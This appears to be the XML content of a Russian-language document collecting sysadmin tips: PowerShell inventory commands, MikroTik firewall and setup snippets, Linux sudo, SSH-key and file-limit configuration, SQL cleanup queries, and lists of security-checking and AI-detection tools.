      <text:p text:style-name="P3"><text:span text:style-name="T5">Copy-Item -Filter *.txt -Path c:\data -Recurse -Destination C:\temp\text. Вы по-прежнему можете выполнять собственные команды, такие как xcopy.exe и robocopy.exe копировать файлы. Создание файлов и папок. Создание новых элементов работает одинаково для всех поставщиков PowerShell. Если поставщик PowerShell имеет несколько типов элементов, например поставщик FileSystem PowerShell различает каталоги и файлы, необходимо указать тип элемента. Эта команда создает папку C:\temp\New Folder: New-Item -Path 'C:</text:span><text:soft-page-break/><text:span text:style-name="T5">\temp\New Folder' -ItemType Directory. Эта команда создает пустой файл C:\temp\New Folder\file.txt: New-Item -Path 'C:\temp\New Folder\file.txt' -ItemType File. Удаление всех файлов и папок в папке. Удалить вложенные элементы можно с помощью командлета Remove-Item, однако он потребует подтверждения удаления, если элемент сам что-нибудь содержит. Например, если вы попытаелись удалить папку C:\temp\DeleteMe , содержащую другие элементы, PowerShell запрашивает подтверждение перед удалением папки: Remove-Item -Path C:\temp\DeleteMe. Если вам не нужно запрашивать каждый содержащийся элемент, укажите параметр Recurse: Remove-Item -Path C:\temp\DeleteMe -Recurse</text:span></text:p>
      <text:p text:style-name="P26">PowerShell скрипты для сбора информации о компьютерах:</text:p>
      <text:p text:style-name="P26">Собираем сведения о рабочих столах локального компьютера:Get-CimInstance -ClassName Win32_Desktop</text:p>
      <text:p text:style-name="P26">Вывод сведений о BIOS: Get-CimInstance -ClassName Win32_BIOS</text:p>
      <text:p text:style-name="P26">Вывод сведений о процессоре:</text:p>
      <text:p text:style-name="P26">Get-CimInstance -ClassName Win32_Processor | Select-Object -ExcludeProperty "CIM*"</text:p>
      <text:p text:style-name="P26">Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object -Property SystemType</text:p>
      <text:p text:style-name="P26">SystemType</text:p>
      <text:p text:style-name="P26">----------</text:p>
      <text:p text:style-name="P26">X86-based PC</text:p>
      <text:p text:style-name="P26">Получить данные поставщика вычислительной техники (OEM): Get-CimInstance -ClassName Win32_ComputerSystem</text:p>
      <text:p text:style-name="P26">Список установленных исправлений: Get-CimInstance -ClassName Win32_QuickFixEngineering</text:p>
      <text:p text:style-name="P27">Перечисление сведений о версии операционной системы:</text:p>
      <text:p text:style-name="P27">Get-CimInstance -ClassName Win32_OperatingSystem |</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>Select-Object -Property BuildNumber,BuildType,OSType,ServicePackMajorVersion,ServicePackMinorVersion</text:p>
      <text:p text:style-name="P26">Общие сведения о локальных пользователях:</text:p>
      <text:p text:style-name="P26">Get-CimInstance -ClassName Win32_OperatingSystem |</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>Select-Object -Property NumberOfLicensedUsers, NumberOfUsers, RegisteredUser</text:p>
      <text:p text:style-name="P26">Get-CimInstance -ClassName Win32_OperatingSystem | Select-Object -Property *user*</text:p>
      <text:p text:style-name="P26">Получение доступного места на диске:</text:p>
      <text:p text:style-name="P26">Get-CimInstance -ClassName Win32_LogicalDisk -Filter "DriveType=3"</text:p>
      <text:p text:style-name="P26">Get-CimInstance -ClassName Win32_LogicalDisk -Filter "DriveType=3" |</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>Measure-Object -Property FreeSpace,Size -Sum |</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>Select-Object -Property Property,Sum</text:p>
      <text:p text:style-name="P26">Получение сведений о сеансе входа: Get-CimInstance -ClassName Win32_LogonSession</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">Отобразить пользователя, вошедшего в определенную компьютерную систему: Get-CimInstance -ClassName Win32_ComputerSystem -Property UserName</text:span></text:p>
      <text:p text:style-name="P26">Получение местного времени с компьютера: Get-CimInstance -ClassName Win32_LocalTime</text:p>
      <text:p text:style-name="P26">Отображение состояния службы:</text:p>
      <text:p text:style-name="P26">Get-CimInstance -ClassName Win32_Service |</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>Select-Object -Property Status,Name,DisplayName</text:p>
      <text:p text:style-name="P26">Get-CimInstance -ClassName Win32_Service |</text:p>
      <text:p text:style-name="P28"><text:s text:c="4"/>Format-Table -Property Status, Name, DisplayName -AutoSize -Wrap</text:p>
      <text:p text:style-name="P26">Лайфхаки по работе с формулами в Excel. В Excel есть множество удивительных лайфхаков для работы с формулами. Вот некоторые из них:</text:p>
      <text:p text:style-name="P26">1. Автозаполнение формул. Если нужно применить формулу к большому диапазону ячеек, вы можете использовать автозаполнение. Просто выделите ячейку с формулой, затем протяните за маленький квадратик в углу этой ячейки, чтобы скопировать формулу на другие ячейки.</text:p>
      <text:p text:style-name="P26">2. Использование абсолютных ссылок ($). Если вы хотите зафиксировать ссылку на определенную ячейку при копировании формулы, используйте символ «$». Например, если вы хотите зафиксировать столбец A, используйте «$A1» или «A$1», если хотите зафиксировать строку.</text:p>
      <text:p text:style-name="P28">3. Показать формулы. Можно выделить все ячейки с формулами на листе, чтобы проверить, где формулы, а где значения. В этом поможет команда «Найти и выделить» → «Формулы». В Google Таблицах используйте «Вид» → «Показать» → «Формулы».</text:p>
      <text:p text:style-name="P26">Подборка ChatGPT расширений для браузера. Часть 2:</text:p>
      <text:p text:style-name="P26">1. Gist AI <text:s/>(https://www.gistai.tech/?utm_source=tool_directory&amp;utm_medium=post&amp;utm_campaign=launch) - бесплатный саммерайзер для веб-сайтов, YouTube и PDF на базе ChatGPT;</text:p>
      <text:p text:style-name="P27">2. AI Character GPT (https://chromewebstore.google.com/detail/ai-character-for-gpt/daoeioifimkjegafelcaljboknjkkohh) - для создания ИИ-ботов в пару кликов на базе ChatGPT или Bard;</text:p>
      <text:p text:style-name="P27">3. ShareGPT (https://sharegpt.com/) - расширение, позволяющие делиться промтами с другими пользователями ИИ;</text:p>
      <text:p text:style-name="P26">4. AI Promt Genius (https://chromewebstore.google.com/detail/ai-prompt-genius/jjdnakkfjnnbbckhifcfchagnpofjffo) - для создания качественных промтов и улучшения существующих;</text:p>
      <text:p text:style-name="P28">5. WebChatGPT <text:s/>(https://chromewebstore.google.com/detail/webchatgpt-chatgpt-%D1%81-%D0%B4%D0%BE%D1%81%D1%82/lpfemeioodjbpieminkklglpmhlngfcn) - <text:s/>добавляет релевантные веб-результаты в ваши подсказки к ChatGPT для более точных и актуальных разговоров.</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">Сетевое администрирование: подборка полезного материала. Администрирование сетей - целый перечень мероприятий, нацеленный на </text:span><text:soft-page-break/><text:span text:style-name="T5">создание, настройку и поддержку корректной и постоянной работы производительности компьютерных сетей. Также оказание техподдержки пользователей, которые работают в одной сетевой группе. В этом посте подготовили для вас подборку материалов, состоящую из серии статей, практических разборов и др.</text:span></text:p>
      <text:p text:style-name="P26">1. Сетевые модели, часть 1. Эталонная сетевая модель OSI. (https://infocisco.ru/network_model_osi.html)</text:p>
      <text:p text:style-name="P26">2. Сетевые модели, часть 2. Сетевая модель TCP/IP или DOD. (https://infocisco.ru/network_model_tcpip.html)</text:p>
      <text:p text:style-name="P26">3. Сетевые модели, часть 3. Инкапсуляция, декапсуляция, данные, пакеты, фреймы, биты, PDU. (https://infocisco.ru/network_model_encapsulation_pdu.html)</text:p>
      <text:p text:style-name="P26">4. Сетевые устройства. Различие роутера от маршрутизатора, от моста, от коммутатора. (https://infocisco.ru/network_devices.html)</text:p>
      <text:p text:style-name="P26">5. Работа сетевых устройств, отражение работ на сетевой эталонной модели OSI. (https://infocisco.ru/works_network_devices.html)</text:p>
      <text:p text:style-name="P26">6. Базовая настройка маршрутизатора для выполнения лабораторных работ CCNA и ICND. Назначение IP-адресов на интерфейсы маршрутизатора. (https://infocisco.ru/cheatsheet_router_configuration_ip_to_interface.html)</text:p>
      <text:p text:style-name="P26">7. CCNA 3 на русском. Ответы, перевод, объяснения. (https://infocisco.ru/answers_ccna_3.html)</text:p>
      <text:p text:style-name="P26">8. Статическая маршрутизация. (https://infocisco.ru/cheatsheet_static_routing.html)</text:p>
      <text:p text:style-name="P26">9. Динамическая маршрутизация. Протокол RIPv2. (https://infocisco.ru/cheatsheet_dinamic_routing_protocol_rip.html)</text:p>
      <text:p text:style-name="P28">10. Cisco CCNA: Деление сети на подсети (PDF). Пример деления сети. (https://infocisco.ru/cs_subnetting.html)</text:p>
      <text:p text:style-name="P26">Онлайн инструменты проверки подозрительных писем, ссылок и файлов:</text:p>
      <text:p text:style-name="P26">1. phish.ly - анализирует е-мэйлы, проверяя URL-адреса и вложения внутри. Создает SHA256 и MD5-хэш для итогового файла со ссылкой на Virus Total. Просто отправьте подозрительное письмо на адрес scan@phish.ly и автоматический ответ будет содержать результаты проверки. </text:p>
      <text:p text:style-name="P27">2. Redirect Detective (https://redirectdetective.com/) - мощный анализатор ссылок, который может узнать куда перенаправляет короткая ссылка, какая партнерская сеть используется, проверяет на каком этапе переправления устанавливаются файлы cookie и т. д.</text:p>
      <text:p text:style-name="P27">3. Is Legit? <text:s/>(https://www.islegitsite.com/) - популярный анти-скам реестр среди зарубежных сайтов. Можно проверить сайт на предмет подозрительности. </text:p>
      <text:p text:style-name="P26">4. Hardenize (https://www.hardenize.com/) - выдает отчет безопасности по любому сайту: HTTPS, информация о домене, данные почты, протоколы и т.д.</text:p>
      <text:p text:style-name="P26">5. Virus Total <text:s/>(https://www.virustotal.com/gui/home/upload) - самый популярный он-лайн антивирус. Проверяет файлы и ссылки. </text:p>
      <text:p text:style-name="P26">6. MetaDefender Cloud - мощный анти-вирусный сканер файлов, ссылок, IP адресов, доменов и хешей. </text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">7. Hybrid Analysis (https://www.hybrid-analysis.com/) - онлайн песочница, в которой можно проверить любой файл. После его отправки на проверку, сайт запускает его в изолированной песочнице VirtualBox или VMware, а затем смотрит, как он поведет себя в системе и делает вывод: опасен он для неё или нет. Из систем есть Windows, Linux Ubuntu и Android.</text:span></text:p>
      <text:p text:style-name="P28">8. Dr. Web - бот, позволяющий проверить подозрительные файлы и ссылки тремя способами: сообщение напрямую, пересланное сообщение из другого чата или же просто добавить бота в чат, где он будет проверять все медиа и ссылки автоматически, по мере их поступления.</text:p>
      <text:p text:style-name="P26">Определяем контент, созданный нейросетями:</text:p>
      <text:p text:style-name="P26">1. AI or Not (https://www.aiornot.com/) - определит картинку, видео или запись голоса;</text:p>
      <text:p text:style-name="P26">2. Content at Scale (https://contentatscale.ai/ai-image-detector/?fpr=ddiy&amp;fp_sid=aiiamgedetect) - определит картинку, сгенерированную ИИ;</text:p>
      <text:p text:style-name="P26">3. Illuminarty (https://illuminarty.ai/en/) - определяет картинку или текст посредством сравнительного анализа;</text:p>
      <text:p text:style-name="P26">4. V7 Deepfake Detector <text:s/>(https://www.v7labs.com/news/v7-releases-deep-fake-detector-for-chrome) - определяет дипфейки, можно запросить демо версию;</text:p>
      <text:p text:style-name="P26">5. AI Text Classifier (https://platform.openai.com/ai-text-classifier) - определяет текст, написанный моделями ChatGPT;</text:p>
      <text:p text:style-name="P26">6. GPTZero - определяет текст, написанный любыми популярными моделями;</text:p>
      <text:p text:style-name="P28">7. AI Content Detector (https://crossplag.com/ai-content-detector/) - сайт с говорящим названием, тоже определяет текст.</text:p>
      <text:p text:style-name="P26">Как защитить сервер Linux? Ограничьте, кто может использовать sudo. Почему: sudo позволяет учетным записям выполнять команды от имени других учетных записей, включая root. Мы хотим убедиться, что только нужные нам учетные записи могут использовать sudo. Цели: привилегии sudo ограничены теми, кто входит в указанную нами группу. Примечания. Возможно, ваша сборка уже сделала это, или у вас уже есть специальная группа, предназначенная для этой цели, поэтому сначала проверьте. Debian создаёт группу sudo. Чтобы просмотреть пользователей, которые входят в эту группу (таким образом, имеют привилегии sudo): cat /etc/group | grep "sudo". Шаги:</text:p>
      <text:p text:style-name="P26">1 - Создайте группу: sudo groupadd sudousers</text:p>
      <text:p text:style-name="P26">2 - Добавьте учетную запись(и) в группу:</text:p>
      <text:p text:style-name="P26">sudo usermod -a -G sudousers user1</text:p>
      <text:p text:style-name="P26">sudo usermod -a -G sudousers user2</text:p>
      <text:p text:style-name="P27">sudo usermod -a -G sudousers <text:s/>…</text:p>
      <text:p text:style-name="P27">Вам нужно будет сделать это для каждой учетной записи на вашем сервере, которой нужны привилегии sudo.</text:p>
      <text:p text:style-name="P26">3 - Создайте резервную копию файла конфигурации sudo /etc/sudoers: sudo cp --archive /etc/sudoers /etc/sudoers-COPY-$(date +"%Y%m%d%H%M%S")</text:p>
      <text:p text:style-name="P26">4 - Отредактируйте файл конфигурации sudo /etc/sudoers: sudo visudo</text:p>
      <text:p text:style-name="P3"><text:soft-page-break/><text:span text:style-name="T5">5 - Скажите sudo, чтобы только пользователи из группы sudousers могли использовать sudo, добавив эту строку, если ее еще нет: %sudousers <text:s text:c="2"/>ALL=(ALL:ALL) ALL</text:span></text:p>
      <text:p text:style-name="P26">Простое копирование ssh ключей между серверами c использованием утилиты ssh-copy-id. Традиционно администраторы решают задачу копирования ssh ключей между серверами путем копирования содержимого файла /root/.ssh/id_rsa.pub с сервера server1 на server2 в файл /root/.ssh/authorized_keys. Копируют обычно из одного терминала в другой, но есть более изящное решение - это использование утилиты ssh-copy-id, которая позволяет скопировать содержимое id_rsa.pub сервера источник (в нашем случае server1) на сервер приемник (server2) в нужный нам authorized_keys не открывая консоль сервера приемника (server2). Исходные данные: 2 сервера с Debian (server1 и server2).</text:p>
      <text:p text:style-name="P26">Задача: Организовать вход по ssh ключу с сервера server1 на server2 с правами root. Генерируем публичный открытый и закрытый ключи, под пользователем root на server1: ssh-keygen -t rsa</text:p>
      <text:p text:style-name="P26">Если на сервере уже есть эти ключи, то он выдаст предупреждение, где нужно будет либо подтвердить замену старых ключей либо отказаться. Мы создаем ключи впервые, поэтому предупреждения не будет, будет выведена примерно такая информация:</text:p>
      <text:p text:style-name="P26">Generating public/private rsa key pair.</text:p>
      <text:p text:style-name="P26">Enter file in which to save the key (/root/.ssh/id_rsa): &lt;-- ENTER</text:p>
      <text:p text:style-name="P26">Created directory '/root/.ssh'.</text:p>
      <text:p text:style-name="P26">Enter passphrase (empty for no passphrase): &lt;-- ENTER</text:p>
      <text:p text:style-name="P26">Enter same passphrase again: &lt;-- ENTER</text:p>
      <text:p text:style-name="P26">Your identification has been saved in /root/.ssh/id_rsa.</text:p>
      <text:p text:style-name="P26">Your public key has been saved in /root/.ssh/id_rsa.pub.</text:p>
      <text:p text:style-name="P26">Вы можете защитить приватный ключ паролем и тогда чтобы попасть на сервер server2 по ssh ключу нужно будет ввести этот пароль, я настоятельно рекомендую для доступа с уровнем root ввести пароль на приватный ключ. Ключи сгенерированы, мы можем проверить под пользователем root выполнив команду: cat ~/.ssh/id_rsa.pub</text:p>
      <text:p text:style-name="P26">В ответ увидим примерно: ssh-rsa AAAAB3Nz.....ywWmpl root@server1</text:p>
      <text:p text:style-name="P26">Теперь нужно передать публичный ключ id_rsa.pub пользователя root на server2, для этого на server1 выполняем: ssh-copy-id -i ~/.ssh/id_rsa.pub root@server2</text:p>
      <text:p text:style-name="P26">Вводим пароль root от сервера server2 и ключ будет передан и записан в нужный файл authorized_keys</text:p>
      <text:p text:style-name="P26">Важное уточнение: Чтобы передать публичный ключ на server2 под root нужно чтобы пользователю root было разрешен вход по ssh на server2, обычно при базовой установке Debian/Ubuntu вход под root по ssh разрешен, это настраивается директивой PermitRootLogin в файле /etc/ssh/sshd_config</text:p>
      <text:p text:style-name="P26">PermitRootLogin yes - Вход под root по ssh разрешен.</text:p>
      <text:p text:style-name="P26">PermitRootLogin no - Вход под root по ssh запрещен.</text:p>
      <text:p text:style-name="P29">PermitRootLogin without-password - Вход под root по ssh разрешен только по ssh ключам.</text:p>
      <text:p text:style-name="P26">PermitRootLogin forced-commands-only - Вход под root по ssh разрешен только по ssh ключам и только для выполнения заранее определенной команды, сама команда прописывается в /root/.ssh/authorized_keys в формате:</text:p>
      <text:p text:style-name="P26">command="rsync" ssh-rsa AAAAB3N……. root@server2</text:p>
      <text:p text:style-name="P28">После изменения PermitRootLogin не забудьте перезапустить службу sshd командой: service sshd restart</text:p>
      <text:p text:style-name="P26">Шпаргалка по фаерволу Mikrotik, пропускаем VPN соединения. 1. Разрешить весь VPN-трафик через VPN-соединения: Надо учитывать, что некоторые виды подключения, например GRE не являются PPP.</text:p>
      <text:p text:style-name="P26">/ip firewall filter</text:p>
      <text:p text:style-name="P26">add chain=forward comment="Permit all PPP" in-interface=all-ppp</text:p>
      <text:p text:style-name="P26">2. Разрешить PPTP-подключение</text:p>
      <text:p text:style-name="P26">/ip firewall filter</text:p>
      <text:p text:style-name="P26">add chain=input dst-port=1723 protocol=tcp comment="Permit PPTP"</text:p>
      <text:p text:style-name="P26">add action=accept chain=input protocol=gre comment="Permit GRE"</text:p>
      <text:p text:style-name="P26">3. Разрешить L2TP-подключение</text:p>
      <text:p text:style-name="P26">/ip firewall filter</text:p>
      <text:p text:style-name="P26">add chain=input dst-port=1701 protocol=udp comment="Permit L2TP"</text:p>
      <text:p text:style-name="P26">4. Разрешить IPSec-подключение</text:p>
      <text:p text:style-name="P26">/ip firewall filter</text:p>
      <text:p text:style-name="P26">add chain=input port=500,4500 protocol=udp comment="Permit IPSec ports 500 and 4500"</text:p>
      <text:p text:style-name="P26">add chain=input protocol=ipsec-esp comment="Permit IPSec protocol ipsec-esp"</text:p>
      <text:p text:style-name="P26">5. Разрешить OpenVPN-подключение</text:p>
      <text:p text:style-name="P26">/ip firewall filter</text:p>
      <text:p text:style-name="P26">add action=accept chain=input dst-port=1194 protocol=tcp comment="Permit OpenVPN"</text:p>
      <text:p text:style-name="P26">6. Разрешить SSTP-подключение</text:p>
      <text:p text:style-name="P26">/ip firewall filter</text:p>
      <text:p text:style-name="P26">add action=accept chain=input dst-port=443 protocol=tcp comment="Permit SSTP"</text:p>
      <text:p text:style-name="P26">7. Разрешить GRE-подключение</text:p>
      <text:p text:style-name="P26">/ip firewall filter</text:p>
      <text:p text:style-name="P26">add action=accept chain=input protocol=gre comment="Permit GRE"</text:p>
      <text:p text:style-name="P26">8. Разрешить IPIP-подключение</text:p>
      <text:p text:style-name="P26">/ip firewall filter</text:p>
      <text:p text:style-name="P26">add action=accept chain=input protocol=ipip comment="Permit IPIP"</text:p>
      <text:p text:style-name="P26">9. Прохождение IPSec при использовании Fast Track</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">Fast Track это опция представленная в RouterOS 6.29. С помощью этой опции можно передавать пакеты в обход ядра Linux. За счет этого существенно </text:span><text:soft-page-break/><text:span text:style-name="T5">повышается производительность маршрутизатора. Включить Fast Track можно следующим образом:</text:span></text:p>
      <text:p text:style-name="P27">/ip firewall filter add chain=forward action=fasttrack-connection connection-state=established,related</text:p>
      <text:p text:style-name="P27">Это позволит пакетам у которых состояние «Established» или «Related» обходить ядро Linux и быть сразу перенаправленным к цели. Такие пакеты не будут проходить ни через одно правило файервола или другое правило обработки пакетов. Конечно, соединение получает состояние «установлено» или «связано» после того, как оно прошло через брандмауэр, поэтому оно по-прежнему будет безопасным. Как результат появляется недостаток: соединения IPsec так же не будут обработаны. Решить эту проблему можно следующим образом. Вначале надо пометить соединения IPsec:</text:p>
      <text:p text:style-name="P26">/ip firewall mangle</text:p>
      <text:p text:style-name="P26">add action=mark-connection chain=forward comment="Mark IPsec" ipsec-policy=out,ipsec new-connection-mark=ipsec</text:p>
      <text:p text:style-name="P26">add action=mark-connection chain=forward comment="Mark IPsec" ipsec-policy=in,ipsec new-connection-mark=ipsec</text:p>
      <text:p text:style-name="P26">Далее изменить стандартное правило Fast Track так, что бы оно не обрабатывало пакеты IPsec. Изменения внесенные в стандартное правило выделены красным.</text:p>
      <text:p text:style-name="P26">/ip firewall filter add action=fasttrack-connection chain=forward comment=FastTrack</text:p>
      <text:p text:style-name="P28">connection-mark=!ipsec connection-state=established,related</text:p>
      <text:p text:style-name="P26">Средства анализа и просмотра log-файлов:</text:p>
      <text:p text:style-name="P26">Alco (Apache Log Colorizing Tool) (https://www.linuxpages.org/) - Утилита для подсветки log-файлов web-сервера Apache. Написана на awk.</text:p>
      <text:p text:style-name="P26">KDE LogViewer (https://kdelogviewer.sourceforge.net/) - Утилита для просмотра log-файлов для KDE. Имеет: фильтр, события, отображение строк разными цветами в зависимости от log-файла.</text:p>
      <text:p text:style-name="P26">Logcheck (https://logcheck.org/) - Простая утилита для фильтрации log-файлов на «не обычные» записи (в.т.ч. и с помощью регулярных выражений) и отправки отчета на e-mail.</text:p>
      <text:p text:style-name="P26">LogMiner (https://logminer.sourceforge.net/) - Мощный анализатор log-файлов для Apache или другого web-сервера, использующего комбинированный формат файлов отчёта. Может выводить детализированную статистику визитов, трафика, навигационных путей, браузеров посетителей и их операционных систем.</text:p>
      <text:p text:style-name="P28">MultiTail (https://github.com/halturin/multitail) - Аналог утилиты tail, позволяющий показывать данные из файлов в нескольких окнах одной консоли. Основан на ncurses.</text:p>
      <text:p text:style-name="P26">Как найти количество открытых файлов в Linux? Значение сохраняется в: # cat /proc/sys/fs/file-max</text:p>
      <text:p text:style-name="P26">Проверка Hard лимит в Linux: # ulimit -Hn</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">Проверка Soft лимит в Linux: # ulimit -Sn</text:span></text:p>
      <text:p text:style-name="P26">Чтобы просмотреть значения Hard и Soft для разных пользователей, переключите пользователя с «su» на пользователя, ограничения которого вы хотите проверить. Например:</text:p>
      <text:p text:style-name="P26"># su root</text:p>
      <text:p text:style-name="P26">$ ulimit -Sn</text:p>
      <text:p text:style-name="P26">$ ulimit -Hn</text:p>
      <text:p text:style-name="P27">Как проверить количество системных дескрипторов файлов в Linux? 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MySQL /</text:p>
      <text:p text:style-name="P27">MariaDB или веб-сервер Apache. Вы можете увеличить лимит открытых файлов в Linux, отредактировав опцию ядра fs.file-max. Для этого используйте утилиту sysctl. Sysctl используется для настройки параметров ядра. Например, чтобы увеличить ограничение на количество открых файла до 500000, вы можете использовать следующую команду: # sysctl -w fs.file-max=500000</text:p>
      <text:p text:style-name="P26">Вы можете проверить текущее значение для количества открытых файлов с помощью следующей команды: $ cat /proc/sys/fs/file-max</text:p>
      <text:p text:style-name="P26">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 # vi /etc/sysctl.conf</text:p>
      <text:p text:style-name="P26">Добавьте следующую команду: fs.file-max=500000</text:p>
      <text:p text:style-name="P26">Конечно, вы можете изменить число в соответствии с вашими потребностями. Чтобы снова проверить изменения, используйте: # cat /proc/sys/fs/file-max</text:p>
      <text:p text:style-name="P26">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 # sysctl -p</text:p>
      <text:p text:style-name="P26">Установка количества открытых файлов для пользователя в Linux. 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root, вам необходимо отредактировать следующий файл: # vi /etc/security/limits.conf</text:p>
      <text:p text:style-name="P26">Если вы администратор Linux,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 Команды, которые вы должны добавить, имеют следующие параметры: &lt;domain&gt; &lt;type&gt; &lt;item&gt; &lt;value&gt;. Вот пример установки Soft и Hard лимитов для пользователя dimon:</text:p>
      <text:p text:style-name="P26">## Example hard limit for max opened files</text:p>
      <text:p text:style-name="P26">dimon hard nofile 4096</text:p>
      <text:p text:style-name="P26">## Example soft limit for max opened files</text:p>
      <text:p text:style-name="P28">dimon soft nofile 1024</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">Подборка SQL-запросов для очистки данных. Удаляем дубликаты записей:</text:span></text:p>
      <text:p text:style-name="P26">DELETE FROM your_table</text:p>
      <text:p text:style-name="P26">WHERE rowid NOT IN (</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>SELECT MAX(rowid)</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>FROM your_table</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>GROUP BY column1, column2, ...</text:p>
      <text:p text:style-name="P26">);</text:p>
      <text:p text:style-name="P26">Удаляем строки с NULL-значениями:</text:p>
      <text:p text:style-name="P26">DELETE FROM your_table</text:p>
      <text:p text:style-name="P26">WHERE column1 IS NULL OR column2 IS NULL;</text:p>
      <text:p text:style-name="P26">Заменяем NULL-значения на дефолтное выражение:</text:p>
      <text:p text:style-name="P26">UPDATE your_table</text:p>
      <text:p text:style-name="P26">SET column1 = 'default_value'</text:p>
      <text:p text:style-name="P26">WHERE column1 IS NULL;</text:p>
      <text:p text:style-name="P27">Переводим текст в верхний регистр:</text:p>
      <text:p text:style-name="P27">UPDATE your_table</text:p>
      <text:p text:style-name="P26">SET column1 = UPPER(column1);</text:p>
      <text:p text:style-name="P26">Обрезаем лишнее:</text:p>
      <text:p text:style-name="P26">UPDATE your_table</text:p>
      <text:p text:style-name="P26">SET column1 = TRIM(column1);</text:p>
      <text:p text:style-name="P26">Конвертируем строки в формат дат:</text:p>
      <text:p text:style-name="P26">UPDATE your_table</text:p>
      <text:p text:style-name="P26">SET date_column = TO_DATE(date_string, 'YYYY-MM-DD');</text:p>
      <text:p text:style-name="P26">Извлекаем год/месяц/день:</text:p>
      <text:p text:style-name="P26">SELECT EXTRACT(YEAR FROM date_column) AS year,</text:p>
      <text:p text:style-name="P26"><text:s text:c="7"/>EXTRACT(MONTH FROM date_column) AS month,</text:p>
      <text:p text:style-name="P26"><text:s text:c="7"/>EXTRACT(DAY FROM date_column) AS day</text:p>
      <text:p text:style-name="P26">FROM your_table;</text:p>
      <text:p text:style-name="P28">#db</text:p>
      <text:p text:style-name="P26">Подборка часто используемых команд для первоначальной настройки устройств MikroTik: имя устройства, DNS сервера, Email, время, доступы и т.д. Установки имени устройства: /system identity set name=MyHomeMikrotik</text:p>
      <text:p text:style-name="P26">Установка своих DNS серверов и отключение получения их по DHCP:</text:p>
      <text:p text:style-name="P26">/ip dns set servers=8.8.8.8,1.1.1.1</text:p>
      <text:p text:style-name="P26">/ip dhcp-client set [find ] use-peer-dns=no</text:p>
      <text:p text:style-name="P26">Настройка email клиента для работы с Yandex.Mail. Для корректной работы разрешите в настройках профиля авторизацию SMTP по обычному паролю или [рекомендуется] используйте пароли приложений (почта):</text:p>
      <text:p text:style-name="P26">/tool e-mail</text:p>
      <text:p text:style-name="P26">set address=smtp.yandex.ru from=example@yandex.ru password=example-pass port=587 start-tls=yes user=example@yandex.ru</text:p>
      <text:p text:style-name="P26">Настройка синхронизации времени по NTP и MikroTik Cloud Time (Москва):</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">/system ntp client set enabled=yes server-dns-names=time.google.com,0.pool.ntp.org,1.pool.ntp.org,2.pool.ntp.org,3.pool.ntp.org</text:span></text:p>
      <text:p text:style-name="P26">/system clock set time-zone-autodetect=no</text:p>
      <text:p text:style-name="P26">/system clock set time-zone-name=Europe/Moscow</text:p>
      <text:p text:style-name="P26">/ip cloud set update-time=yes </text:p>
      <text:p text:style-name="P26">Изменение количества строк системного лога: /system logging action set memory memory-lines=10000</text:p>
      <text:p text:style-name="P26">Очистка системного лога (оставляет сообщение о смене настроек лога):</text:p>
      <text:p text:style-name="P26">/system logging action set memory memory-lines=1</text:p>
      <text:p text:style-name="P28">/system logging action set memory memory-lines=10000</text:p>
      <text:p text:style-name="P26">Контроль доступа с IP адресов домена. Это позволяет использовать DynamicDNS для записей своего домена, и получать доступ к устройству с IP адресов, которые будут резолвится с домена. RouterOS будет сам обновлять записи и access-list при изменении записи в домене. Обратите внимание, в конце 2 строки с move. Это сделано для того, чтобы правило корректно двигалось на первое место при включенном fasttrack (то есть первое место), а также при отключенном (на нулевое место):</text:p>
      <text:p text:style-name="P26">/ip firewall address-list</text:p>
      <text:p text:style-name="P27">add address=access.example.con list=DomainIPsAccess</text:p>
      <text:p text:style-name="P27">/ip firewall filter</text:p>
      <text:p text:style-name="P26">add action=accept chain=input src-address-list=DomainIPsAccess comment="Allow DomainIPsAccess"</text:p>
      <text:p text:style-name="P26">move [find comment="Allow DomainIPsAccess"] 1</text:p>
      <text:p text:style-name="P26">move [find comment="Allow DomainIPsAccess"] 0</text:p>
      <text:p text:style-name="P26">Отключение ненужных служб доступа (web тоже отключается, осторожно):</text:p>
      <text:p text:style-name="P26">/ip service disable www,ftp,api,api-ssl,telnet</text:p>
      <text:p text:style-name="P26">/ip service enable ssh,winbox</text:p>
      <text:p text:style-name="P26">/ip service set ssh address=""</text:p>
      <text:p text:style-name="P26">/ip service set winbox address=""</text:p>
      <text:p text:style-name="P26">Фикс MTU (нужен редко, но метко):</text:p>
      <text:p text:style-name="P26">/ip firewall mangle</text:p>
      <text:p text:style-name="P26">add chain=postrouting out-interface-list=WAN protocol=tcp tcp-flags=syn,!ack action=change-mss new-mss=clamp-to-pmtu comment="MTU Fix" passthrough=yes</text:p>
      <text:p text:style-name="P26">Заблокировать доступ к WiFi по MAC-адресу: /interface wireless access-list authentication=no mac-address=8A:EA:B7:2E:38:C1 </text:p>
      <text:p text:style-name="P26">Поместить клиента WiFi в отдельный VLAN по MAC-адресу:</text:p>
      <text:p text:style-name="P26">/interface wireless access-list</text:p>
      <text:p text:style-name="P26">add interface=all mac-address=8A:EA:B7:2E:38:C1 vlan-id=99 vlan-mode=use-tag</text:p>
      <text:p text:style-name="P26">Настройка пароля и безопасности WiFi на default профиль:</text:p>
      <text:p text:style-name="P26">/interface wireless security-profiles set default mode=dynamic</text:p>
      <text:p text:style-name="P26">-keys authentication-types=wpa2-psk unicast-ciphers=aes-ccm group-ciphers=aes-ccm</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">wpa2-pre-shared-key=bigpassword</text:span></text:p>
      <text:p text:style-name="P28">Включение пробросов портов SSH: /ip ssh set forwarding-enabled=both</text:p>
